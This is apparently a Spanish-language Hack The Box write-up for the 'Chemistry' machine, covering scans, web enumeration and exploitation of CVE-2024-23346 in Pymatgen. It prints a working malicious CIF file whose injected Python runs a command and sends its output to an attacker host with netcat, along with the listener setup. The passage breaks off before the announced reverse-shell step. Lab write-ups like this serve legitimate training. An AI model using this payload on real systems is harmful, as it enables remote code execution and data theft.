---
description: >-
  Writeup de la máquina de dificultad fácil Chemistry de la página https://hackthebox.eu
title: HTB - Chemistry | (Difficulty Easy) - Linux
date: 2025-03-01
categories: [Writeup, Hack the Box]
tags: [htb, hacking, hack the box, linux, easy, writeup, redteam, pentesting]
image_post: true
image: https://github.com/user-attachments/assets/6e856231-708d-477b-bba9-10d3f2e4e555
---

## Useful Skills

* Web enumeration
* Abusing Pymatgen <2024.2.20. Arbitrary Code Execution (CVE-2024-23346)
* 

## Enumeration

### TCP Scan

 ```bash
rustscan -a 10.10.11.38 --ulimit 5000 -g
10.10.11.38 -> [22,5000]
```

```bash
nmap -p22,5000 -sCV 10.10.11.38 -oN tcpScan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 14:11 CET
Nmap scan report for 10.10.11.38 (10.10.11.38)
Host is up (0.034s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
|_http-title: Chemistry - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.87 seconds
```

### UDP Scan

```bash
nmap -sU --top-ports 1500 --min-rate 5000 -n -Pn 10.10.11.38 -oN udpScan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 14:12 CET
Nmap scan report for 10.10.11.38
Host is up (0.035s latency).
Not shown: 1495 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
7/udp     closed echo
69/udp    closed tftp
16402/udp closed unknown
31134/udp closed unknown
36108/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds
```

### HTTP Enumeration

Whatweb detecta un servidor web Werkzeug/3.0.3 Python/3.9.5

```bash
whatweb http://10.10.11.38:5000
http://10.10.11.38:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.9.5], IP[10.10.11.38], Python[3.9.5], Title[Chemistry - Home], Werkzeug[3.0.3]
```

Accediendo a http://10.10.11.38/ y observo una web que suspuestamente tiene una herramienta que permite cargar un CIF (Archivo de Información Cristalográfica) y analizar los datos estructurales que contiene. Por otra lado tambíen existe la posibilidad de iniciar sesión o registrarse

![image](https://github.com/user-attachments/assets/7beb8c29-106c-4c1d-a9ca-8a98c18fc6c1)

Me registro en la web como un usuario con bajos privilegios

![image](https://github.com/user-attachments/assets/6a5c501d-6a08-4f70-b0e3-dfc59f91272d)

Una vez registrado consigo observar una panel el cual permite la carga de un archivo CIF, también adjuntan para descargar un ejemplo de un archivo CIF

![image](https://github.com/user-attachments/assets/91fc3e0c-2c30-4e9b-bc34-0c4f5012f759)

## Vulnerability analysis

### Arbitrary Code Execution

Una pequeña búsqueda en internet me permite dar con la vulnerabilidad CVE-2024-23346, se trata de una ejecución remota de código a través de la biblioteca Pymatgen, ya que en el método JonesFaithfulTransformation.from_transformation_str()` utiliza de forma insegura la función eval() para procesar la entrada del usuario

* [NVD Explanation CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346)

## Exploitation

### Abusing Pymatgen <2024.2.20. Arbitrary Code Execution (CVE-2024-23346)

Encuentro un repositorio de GitHub sobre la vulnerabilidad CVE-2024-23346 el cual me sirve de guía para realizar la explotación y entender como funciona todo.

* [Arbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

![image](https://github.com/user-attachments/assets/f1b5a05a-f7c8-478c-822d-fd765b114217)

Preparo mi archivo malicioso CIF, donde ejecuto un whoami y envío el output con netcat por el puerto 1234, lo cual me servirá para ver con que usuario ganaré acceso al sistema

```bash
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("whoami | nc 10.10.14.23 1234");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Inicio un listener con netcat por el puerto 1234 para obtener la respuesta 

```bash
nc -lvnp 1234
listening on [any] 1234 ...
```

Subo el archivo malicioso evil.cif y hago clic sobre View, obtengo que el usuario con el que ganaré acceso al sistema es el usuario app

![image](https://github.com/user-attachments/assets/2ff8532f-2b03-41ea-aa96-875c0276c1f4)

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.11.38] 39934
app
```

Preparo de nuevo mi archivo malicioso CIF, donde envío una reverse shell hacia mi máquina para ganar acceso al sistema como el usuario app

```bash

```
